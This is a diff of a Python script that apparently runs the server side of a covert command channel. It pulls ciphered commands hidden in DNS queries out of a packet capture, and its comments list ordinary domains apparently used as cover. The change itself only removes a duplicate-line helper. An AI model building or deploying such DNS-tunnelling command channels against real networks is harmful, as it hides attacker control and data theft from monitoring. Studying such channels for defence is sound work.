@@ -19,9 +19,7 @@ def receive_command():
     print("pcap collected...")
     dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
     cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
-    cloaked_command = remove_dup_lines(cloakedFile, "_"+cloakedFile)
-    os.remove(cloakedFile)
-    os.rename("_"+cloakedFile, cloakedFile)
+
     cloaked_command = cloakedFile #"cloaked.payload"
     decloaked_command = "decloaked_command.txt"
     
@@ -85,24 +83,7 @@ def send_response(response):
 #www.groupon.com
 #www.target.com
 #www.office.com -> non deve essere rimosso
-def remove_dup_lines(file_input, file_output):
-  with open(file_input, "r") as infile, open(file_output, "w") as outfile:
-    previous_line = None
-    for line in infile:
-      if line != previous_line:  # Check for non-consecutive duplicates
-        outfile.write(line)
-      previous_line = line.rstrip("\n")  # Store previous line without newline
 
-  return file_output
-"""   with open(file_input, "r") as infile, open(file_output, "w") as outfile:
-    previous_line = None
-    for line in infile:
-      if previous_line and line.rstrip("\n") != previous_line.rstrip("\n"):  # Check for non-consecutive duplicates
-        print(line, previous_line)
-        outfile.write(line)
-      previous_line = line.rstrip("\n")  # Store previous line without newline
-
-  return file_output """
 
 if __name__ == "__main__":
     print("Server in attesa di richieste...")
